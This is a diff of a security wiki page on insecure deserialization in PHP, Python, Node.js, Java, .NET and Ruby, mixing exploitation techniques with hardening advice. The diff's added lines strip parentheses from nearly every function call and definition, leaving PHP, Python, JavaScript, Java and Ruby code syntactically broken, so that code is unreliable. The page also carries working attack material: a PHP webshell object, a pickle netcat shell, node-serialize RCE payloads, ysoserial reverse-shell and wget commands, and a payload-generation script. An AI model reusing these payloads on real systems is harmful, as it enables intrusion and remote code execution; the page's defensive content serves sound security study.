@@ -23,40 +23,40 @@ In PHP, specific magic methods are utilized during the serialization and deseria
 <?php
 class test {
     public $s = "This is a test";
-    public function displaystring(){
+    public function displaystring{
         echo $this->s.'<br />';
     }
-    public function __toString()
+    public function __toString
     {
         echo '__toString method called';
     }
-    public function __construct(){
+    public function __construct{
         echo "__construct method called";
     }
-    public function __destruct(){
+    public function __destruct{
         echo "__destruct method called";
     }
-    public function __wakeup(){
+    public function __wakeup{
         echo "__wakeup method called";
     }
-    public function __sleep(){
+    public function __sleep{
         echo "__sleep method called";
         return array("s"); #The "s" makes references to the public attribute
     }
 }
 
-$o = new test();
-$o->displaystring();
+$o = new test;
+$o->displaystring;
 $ser=serialize($o);
 echo $ser;
 $unser=unserialize($ser);
-$unser->displaystring();
+$unser->displaystring;
 
 /*
-php > $o = new test();
+php > $o = new test;
 __construct method called
 __destruct method called
-php > $o->displaystring();
+php > $o->displaystring;
 This is a test<br />
 
 php > $ser=serialize($o);
@@ -69,7 +69,7 @@ php > $unser=unserialize($ser);
 __wakeup method called
 __destruct method called
 
-php > $unser->displaystring();
+php > $unser->displaystring;
 This is a test<br />
 */
 ?>
@@ -78,7 +78,7 @@ This is a test<br />
 If you look to the results you can see that the functions **`__wakeup`** and **`__destruct`** are called when the object is deserialized. Note that in several tutorials you will find that the **`__toString`** function is called when trying yo print some attribute, but apparently that's **not happening anymore**.
 
 > [!WARNING]
-> The method **`__unserialize(array $data)`** is called **instead of `__wakeup()`** if it is implemented in the class. It allows you to unserialize the object by providing the serialized data as an array. You can use this method to unserialize properties and perform any necessary tasks upon deserialization.
+> The method **`__unserialize(array $data)`** is called **instead of `__wakeup`** if it is implemented in the class. It allows you to unserialize the object by providing the serialized data as an array. You can use this method to unserialize properties and perform any necessary tasks upon deserialization.
 >
 > ```php
 > class MyClass {
@@ -126,9 +126,9 @@ $ser=serialize($o);
 ### Preventing PHP Object Injection with `allowed_classes`
 
 > [!INFO]
-> Support for the **second argument** of `unserialize()` (the `$options` array) was added in **PHP 7.0**. On older versions the function only accepts the serialized string, making it impossible to restrict which classes may be instantiated.
+> Support for the **second argument** of `unserialize` (the `$options` array) was added in **PHP 7.0**. On older versions the function only accepts the serialized string, making it impossible to restrict which classes may be instantiated.
 
-`unserialize()` will **instantiate every class** it finds inside the serialized stream unless told otherwise.  Since PHP 7 the behaviour can be restricted with the [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) option:
+`unserialize` will **instantiate every class** it finds inside the serialized stream unless told otherwise.  Since PHP 7 the behaviour can be restricted with the [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) option:
 
 ```php
 // NEVER DO THIS – full object instantiation
@@ -145,14 +145,14 @@ $object = unserialize($userControlledData, [
 ]);
 ```
 
-If **`allowed_classes` is omitted _or_ the code runs on PHP < 7.0**, the call becomes **dangerous** as an attacker can craft a payload that abuses magic methods such as `__wakeup()` or `__destruct()` to achieve Remote Code Execution (RCE).
+If **`allowed_classes` is omitted _or_ the code runs on PHP < 7.0**, the call becomes **dangerous** as an attacker can craft a payload that abuses magic methods such as `__wakeup` or `__destruct` to achieve Remote Code Execution (RCE).
 
 #### Real-world example: Everest Forms (WordPress) CVE-2025-52709
 
 The WordPress plugin **Everest Forms ≤ 3.2.2** tried to be defensive with a helper wrapper but forgot about legacy PHP versions:<sup>[[4]](#references)</sup>
 
 ```php
-function evf_maybe_unserialize($data, $options = array()) {
+function evf_maybe_unserialize($data, $options = array) {
     if (is_serialized($data)) {
         if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
             // SAFE branch (PHP ≥ 7.1)
@@ -172,10 +172,10 @@ On servers that still ran **PHP ≤ 7.0** this second branch led to a classic **
 O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
 ```
 
-As soon as the admin viewed the entry, the object was instantiated and `SomeClass::__destruct()` got executed, resulting in arbitrary code execution.
+As soon as the admin viewed the entry, the object was instantiated and `SomeClass::__destruct` got executed, resulting in arbitrary code execution.
 
 **Take-aways**
-1. Always pass `['allowed_classes' => false]` (or a strict white-list) when calling `unserialize()`.
+1. Always pass `['allowed_classes' => false]` (or a strict white-list) when calling `unserialize`.
 2. Audit defensive wrappers – they often forget about the legacy PHP branches.
 3. Upgrading to **PHP ≥ 7.x** alone is *not* sufficient: the option still needs to be supplied explicitly.
 
@@ -185,11 +185,11 @@ As soon as the admin viewed the entry, the object was instantiated and `SomeClas
 
 [**PHPGGC**](https://github.com/ambionics/phpggc) can help you generating payloads to abuse PHP deserializations.\
 Note than in several cases you **won't be able to find a way to abuse a deserialization in the source code** of the application but you may be able to **abuse the code of external PHP extensions.**\
-So, if you can, check the `phpinfo()` of the server and **search on the internet** (an even on the **gadgets** of **PHPGGC**) some possible gadget you could abuse.
+So, if you can, check the `phpinfo` of the server and **search on the internet** (an even on the **gadgets** of **PHPGGC**) some possible gadget you could abuse.
 
 ### phar:// metadata deserialization
 
-If you have found a LFI that is just reading the file and not executing the php code inside of it, for example using functions like _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** You can try to abuse a **deserialization** occurring when **reading** a **file** using the **phar** protocol.\
+If you have found a LFI that is just reading the file and not executing the php code inside of it, for example using functions like _**file_get_contents, fopen, file or file_exists, md5_file, filemtime or filesize**_**.** You can try to abuse a **deserialization** occurring when **reading** a **file** using the **phar** protocol.\
 For more information read the following post:
 
 
@@ -207,10 +207,10 @@ import pickle, os, base64
 class P(object):
     def __reduce__(self):
         return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
-print(base64.b64encode(pickle.dumps(P())))
+print(base64.b64encode(pickle.dumps(P)))
 ```
 
-Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.
+Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P,2)))` to generate an object that is compatible with python2 if you're running python3.
 
 For more information about escaping from **pickle jails** check:
 
@@ -241,15 +241,15 @@ Another **"magic" way to call a function** without calling it directly is by **c
 ```javascript
 // If you can compromise p (returned object) to be a promise
 // it will be executed just because it's the return object of an async function:
-async function test_resolve() {
+async function test_resolve {
   const p = new Promise((resolve) => {
     console.log("hello")
-    resolve()
+    resolve
   })
   return p
 }
 
-async function test_then() {
+async function test_then {
   const p = new Promise((then) => {
     console.log("hello")
     return 1
@@ -257,8 +257,8 @@ async function test_then() {
   return p
 }
 
-test_ressolve()
-test_then()
+test_ressolve
+test_then
 //For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
 ```
 
@@ -275,7 +275,7 @@ This library allows to serialise functions. Example:
 
 ```javascript
 var y = {
-  rce: function () {
+  rce: function  {
     require("child_process").exec("ls /", function (error, stdout, stderr) {
       console.log(stdout)
     })
@@ -289,7 +289,7 @@ console.log("Serialized: \n" + payload_serialized)
 The **serialised object** will looks like:
 
 ```bash
-{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
+{"rce":"_$$ND_FUNC$$_function{ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
 ```
 
 You can see in the example that when a function is serialized the `_$$ND_FUNC$$_` flag is appended to the serialized object.
@@ -309,7 +309,7 @@ In the next chunk of code **notice the last parenthesis** and how the `unseriali
 ```javascript
 var serialize = require("node-serialize")
 var test = {
-  rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
+  rce: "_$$ND_FUNC$$_function{ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }",
 }
 serialize.unserialize(test)
 ```
@@ -327,28 +327,28 @@ You can [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-
 
 ### [funcster](https://www.npmjs.com/package/funcster)
 
-A noteworthy aspect of **funcster** is the inaccessibility of **standard built-in objects**; they fall outside the accessible scope. This restriction prevents the execution of code that attempts to invoke methods on built-in objects, leading to exceptions such as `"ReferenceError: console is not defined"` when commands like `console.log()` or `require(something)` are used.
+A noteworthy aspect of **funcster** is the inaccessibility of **standard built-in objects**; they fall outside the accessible scope. This restriction prevents the execution of code that attempts to invoke methods on built-in objects, leading to exceptions such as `"ReferenceError: console is not defined"` when commands like `console.log` or `require(something)` are used.
 
 Despite this limitation, restoration of full access to the global context, including all standard built-in objects, is possible through a specific approach. By leveraging the global context directly, one can bypass this restriction. For instance, access can be re-established using the following snippet:
 
 ```javascript
 funcster = require("funcster")
 //Serialization
-var test = funcster.serialize(function () {
+var test = funcster.serialize(function  {
   return "Hello world!"
 })
-console.log(test) // { __js_function: 'function(){return"Hello world!"}' }
+console.log(test) // { __js_function: 'function{return"Hello world!"}' }
 
 //Deserialization with auto-execution
-var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
+var desertest1 = { __js_function: 'function{return "Hello world!"}' }
 funcster.deepDeserialize(desertest1)
 var desertest2 = {
-  __js_function: 'this.constructor.constructor("console.log(1111)")()',
+  __js_function: 'this.constructor.constructor("console.log(1111)")',
 }
 funcster.deepDeserialize(desertest2)
 var desertest3 = {
   __js_function:
-    "this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
+    "this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")",
 }
 funcster.deepDeserialize(desertest3)
 ```
@@ -370,14 +370,14 @@ If this function is used to deserialize objects you can **easily exploit it**:
 ```javascript
 var serialize = require("serialize-javascript")
 //Serialization
-var test = serialize(function () {
+var test = serialize(function  {
   return "Hello world!"
 })
-console.log(test) //function() { return "Hello world!" }
+console.log(test) //function { return "Hello world!" }
 
 //Deserialization
 var test =
-  "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
+  "function{ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }"
 deserialize(test)
 ```
 
@@ -489,7 +489,7 @@ If you want to **learn about how does a Java Deserialized exploit work** you sho
 
 #### SignedObject-gated deserialization and pre-auth reachability
 
-Modern codebases sometimes wrap deserialization with `java.security.SignedObject` and validate a signature before calling `getObject()` (which deserializes the inner object). This prevents arbitrary top-level gadget classes but can still be exploitable if an attacker can obtain a valid signature (e.g., private-key compromise or a signing oracle). Additionally, error-handling flows may mint session-bound tokens for unauthenticated users, exposing otherwise protected sinks pre-auth.<sup>[[10]](#references)</sup>
+Modern codebases sometimes wrap deserialization with `java.security.SignedObject` and validate a signature before calling `getObject` (which deserializes the inner object). This prevents arbitrary top-level gadget classes but can still be exploitable if an attacker can obtain a valid signature (e.g., private-key compromise or a signing oracle). Additionally, error-handling flows may mint session-bound tokens for unauthenticated users, exposing otherwise protected sinks pre-auth.<sup>[[10]](#references)</sup>
 
 For a concrete case study with requests, IoCs, and hardening guidance, see:
 
@@ -572,14 +572,14 @@ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkoc
 # Reverse shell
 ## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
 java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
-## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket;s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno,fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"
 
 # Base64 encode payload in base64
 base64 -w0 payload
 ```
 
-When creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).
+When creating a payload for **java.lang.Runtime.exec** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).
 
 Feel free to use the next script to create **all the possible code execution** payloads for Windows and Linux and then test them on the vulnerable web page:
 
@@ -594,8 +594,8 @@ def generate(name, cmd):
         final = cmd.replace('REPLACE', payload)
         print 'Generating ' + payload + ' for ' + name + '...'
         command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
-        result = command.read()
-        command.close()
+        result = command.read
+        command.close
         encoded = base64.b64encode(result)
         if encoded != "":
             open(name + '_intruder.txt', 'a').write(encoded + '\n')
@@ -669,7 +669,7 @@ public class myAccount implements Serializable
 
 #### Avoid Serialization of a class that need to implements Serializable
 
-In scenarios where certain **objects must implement the `Serializable`** interface due to class hierarchy, there's a risk of unintentional deserialization. To prevent this, ensure these objects are non-deserializable by defining a `final` `readObject()` method that consistently throws an exception, as shown below:
+In scenarios where certain **objects must implement the `Serializable`** interface due to class hierarchy, there's a risk of unintentional deserialization. To prevent this, ensure these objects are non-deserializable by defining a `final` `readObject` method that consistently throws an exception, as shown below:
 
 ```java
 private final void readObject(ObjectInputStream in) throws java.io.IOException {
@@ -684,7 +684,7 @@ private final void readObject(ObjectInputStream in) throws java.io.IOException {
 - The deserialization code is under your control.
 - The classes expected for deserialization are known.
 
-Override the **`resolveClass()`** method to limit deserialization to allowed classes only. This prevents deserialization of any class except those explicitly permitted, such as in the following example that restricts deserialization to the `Bicycle` class only:
+Override the **`resolveClass`** method to limit deserialization to allowed classes only. This prevents deserialization of any class except those explicitly permitted, such as in the following example that restricts deserialization to the `Bicycle` class only:
 
 ```java
 // Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
@@ -699,8 +699,8 @@ public class LookAheadObjectInputStream extends ObjectInputStream {
     */
     @Override
     protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
-        if (!desc.getName().equals(Bicycle.class.getName())) {
-            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
+        if (!desc.getName.equals(Bicycle.class.getName)) {
+            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName);
         }
         return super.resolveClass(desc);
     }
@@ -723,9 +723,9 @@ To utilize serialization filters, you can set a global filter that applies to al
 
 ```java
 ObjectInputFilter filter = info -> {
-    if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
-    if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
-    if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
+    if (info.depth > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
+    if (info.references > MAX_REFERENCES) return Status.REJECTED; // Limit references
+    if (info.serialClass != null && !allowedClasses.contains(info.serialClass.getName)) {
         return Status.REJECTED; // Restrict to allowed classes
     }
     return Status.ALLOWED;
@@ -866,7 +866,7 @@ Take a look to this POST about **how to try to exploit the \_\_ViewState paramet
 ### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE
 
 - Affected endpoints:
-  - `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie decrypted then deserialized with BinaryFormatter.
+  - `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie AuthorizationCookie decrypted then deserialized with BinaryFormatter.
   - `/ReportingWebService.asmx` → ReportEventBatch and related SOAP ops that reach SoapFormatter sinks; base64 gadget is processed when the WSUS console ingests the event.
 - Root cause: attacker‑controlled bytes reach legacy .NET formatters (BinaryFormatter/SoapFormatter) without strict allow‑lists/binders, so gadget chains execute as the WSUS service account (often SYSTEM).<sup>[[29]](#references)</sup>
 
@@ -884,7 +884,7 @@ ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
 2) Craft SOAP for `ReportEventBatch` embedding the base64 gadget and POST it to `/ReportingWebService.asmx`.
 3) When an admin opens the WSUS console, the event is deserialized and the gadget fires (RCE as SYSTEM).
 
-AuthorizationCookie / GetCookie()
+AuthorizationCookie / GetCookie
 - A forged AuthorizationCookie can be accepted, decrypted, and passed to a BinaryFormatter sink, enabling pre‑auth RCE if reachable.
 
 Public PoC (tecxx/CVE-2025-59287-WSUS) parameters:<sup>[[30]](#references)</sup>
@@ -997,9 +997,9 @@ puts Base64.encode64(payload)
 
 Other RCE chain to exploit Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)<sup>[[31]](#references)</sup>
 
-### Ruby .send() method
+### Ruby .send method
 
-As explained in [**this archived vulnerability report**](https://web.archive.org/web/20260000000000id_/https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), if unsanitized user input reaches the `.send()` method of a Ruby object, the method can **invoke another method** of that object with attacker-controlled arguments.<sup>[[32]](#references)</sup>
+As explained in [**this archived vulnerability report**](https://web.archive.org/web/20260000000000id_/https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), if unsanitized user input reaches the `.send` method of a Ruby object, the method can **invoke another method** of that object with attacker-controlled arguments.<sup>[[32]](#references)</sup>
 
 For example, calling eval and then ruby code as second parameter will allow to execute arbitrary code:
 
@@ -1007,7 +1007,7 @@ For example, calling eval and then ruby code as second parameter will allow to e
 <Object>.send('eval', '<user input with Ruby code>') == RCE
 ```
 
-Moreover, if only one parameter of **`.send()`** is controlled by an attacker, as mentioned in the previous writeup, it's possible to call any method of the object that **doesn't need arguments** or whose arguments have **default values**.\
+Moreover, if only one parameter of **`.send`** is controlled by an attacker, as mentioned in the previous writeup, it's possible to call any method of the object that **doesn't need arguments** or whose arguments have **default values**.\
 For this, it's possible to enumerate all the methods of the object to **find some interesting methods that fulfil those requirements**.
 
 ```ruby
@@ -1018,18 +1018,18 @@ For this, it's possible to enumerate all the methods of the object to **find som
 ## Find methods with those requirements
 repo = Repository.find(1)  # get first repo
 repo_methods = [           # get names of all methods accessible by Repository object
-  repo.public_methods(),
-  repo.private_methods(),
-  repo.protected_methods(),
-].flatten()
+  repo.public_methods,
+  repo.private_methods,
+  repo.protected_methods,
+].flatten
 
-repo_methods.length()      # Initial number of methods => 5542
+repo_methods.length      # Initial number of methods => 5542
 
 ## Filter by the arguments requirements
-candidate_methods = repo_methods.select() do |method_name|
-  [0, -1].include?(repo.method(method_name).arity())
+candidate_methods = repo_methods.select do |method_name|
+  [0, -1].include?(repo.method(method_name).arity)
 end
-candidate_methods.length() # Final number of methods=> 3595
+candidate_methods.length # Final number of methods=> 3595
 ```
 
 ### Ruby class pollution
@@ -1227,7 +1227,7 @@ Industrialized gadget discovery:
 
 ## References
 
-- [1] [NotSoSecure – Remote Code Execution via PHP unserialize()](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)
+- [1] [NotSoSecure – Remote Code Execution via PHP unserialize](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)
 - [2] [Exploit-DB – Deserialization Vulnerability (PDF)](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)
 - [3] [SecurityCafe – Understanding PHP Object Injection](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)
 - [4] [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)
